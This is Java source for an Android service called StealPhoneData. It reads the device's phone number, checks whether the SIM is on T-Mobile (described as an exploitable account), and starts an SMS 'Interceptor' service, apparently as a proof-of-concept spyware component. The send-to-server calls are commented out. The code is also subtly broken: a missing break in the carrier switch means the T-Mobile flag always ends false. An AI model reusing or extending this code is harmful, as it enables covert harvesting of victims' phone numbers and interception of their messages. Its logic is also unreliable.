package com.example.aahewins.helloworld;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.widget.Toast;
/**
 * Steals the phone number and prepares to send it to the server
 * @author Anthony Hewins
 * @version 1.2
 * @since 1.0
 */
public class StealPhoneData extends IntentService {
    private String phoneNumber = "ERROR";//Holds the phone number so it can be sent to the server.
                                         //By default, it says ERROR unless line1 satisfies the
                                         //criteria of a valid number.
    private boolean isTMobile; //Determines if the user has TMobile as an exploit
    /**
     * Default constructor
     */
    public StealPhoneData() {
        super("StealPhoneData");
    }
    /**
     * Creates the StealPhoneData IntentService, stealing the phone number and sending it.
     * Also starts the SMS BroadcastReceiver to wait until a message has been sent.
     */
    @Override
    public void onCreate() {
        super.onCreate();
        TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        getPhoneNumber(manager.getLine1Number());
        Toast.makeText(this, "Extracted phone number:\n" + this.phoneNumber, Toast.LENGTH_SHORT).show();
        getProvider(manager);
//        if (getProvider(manager)) new SendToServer(this, "T-Mobile User");
//        new SendToServer(this);
        startService(new Intent(this, Interceptor.class));
    }
    /**
     * Gets the phone number and assigns it to the field phoneNumber
     * for the calling object using TelephonyManager. If the phone number is too long, the
     * variable keeps the default value, "ERROR".
     * @param s The phone number from the TelephonyManager object
     */
    public void getPhoneNumber(String s) {
        if (s.length() <= 11)
            this.phoneNumber = s;
    }
    /**
     * Grabs the SIM operator number and checks if the number is under T-Mobile. If it is, this
     * user's T-Mobile account is vulnerable to the attack, which is information the attacker will
     * be sent in addition to the phone number.
     * @param manager The TelephonyManager object to grab the SIM provider.
     * @return Whether or not the user has T-Mobile or not
     */
    public void getProvider(TelephonyManager manager) {
        switch(Integer.parseInt(manager.getSimOperator())) {
            case 310026:
            case 310160:
            case 310200:
            case 310210:
            case 310220:
            case 310230:
            case 310240:
            case 310250:
            case 310260:
            case 310270:
            case 310280:
            case 310290:
            case 310310:
            case 310330:
            case 310580:
            case 310660:
            case 310800:
                Toast.makeText(this, "So you're a T-Mobile user...", Toast.LENGTH_LONG).show();
                this.isTMobile = true;
            default:
                Toast.makeText(this, "So you're not a T-Mobile user...", Toast.LENGTH_LONG).show();
                this.isTMobile = false;
        }
    }
    /**
     * Not needed for this project, but overriden to prevent compiler errors.
     * @param intent N/a
     */
    @Override
    protected void onHandleIntent(Intent intent) {}
    /**
     * Gets the phone number associated with this object
     * @return Phone number
     */
    public String getPhoneNumber() {
        return this.phoneNumber;
    }
    /**
     * Gets the provider for this object
     * @return If the provider is TMobile or not
     */
    public boolean isTMobile() {
        return this.isTMobile;
    }
}

